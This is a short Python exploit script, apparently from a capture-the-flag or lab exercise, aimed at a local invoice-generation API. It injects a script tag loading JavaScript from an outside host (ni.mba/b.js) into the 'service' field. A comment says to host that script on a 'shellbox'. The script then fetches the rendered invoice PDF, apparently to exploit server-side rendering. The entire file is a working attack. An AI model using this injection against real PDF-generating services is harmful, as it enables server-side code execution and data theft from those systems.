#!/bin/env python3

import requests

headers = {
    "Host": "127.0.0.1:9400",
    "Accept": "application/json, text/javascript, */*; q=0.01",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate",
    "Content-Type": "application/json",
    "X-Requested-With": "XMLHttpRequest",
    "Content-Length": "173",
    "Origin": "http://127.0.0.1:9400",
    "Connection": "close",
    "Referer": "http://127.0.0.1:9400/sample-page.html",
}

# Host the b.js script on the shellbox, and serve it on port 8000
data = '{"companyName":"a","service":"<script src=//ni.mba/b.js></script>","description":"a","priceCents":1,"quantity":1,"total":1,"tax":1,"grandTotal":1}'

response = requests.post(
    "http://127.0.0.1:9400/api", headers=headers, data=data, verify=False
)

if response.json()["result"] == "success":
    headers = {
        "Host": "127.0.0.1:9400",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate",
        "Connection": "close",
        "Upgrade-Insecure-Requests": "1",
        "Pragma": "no-cache",
        "Cache-Control": "no-cache",
    }

    response = requests.get(
        "http://127.0.0.1:9400/output/invoice.pdf", headers=headers, verify=False
    )

    with open("invoice.pdf", "wb") as f:
        f.write(response.content)
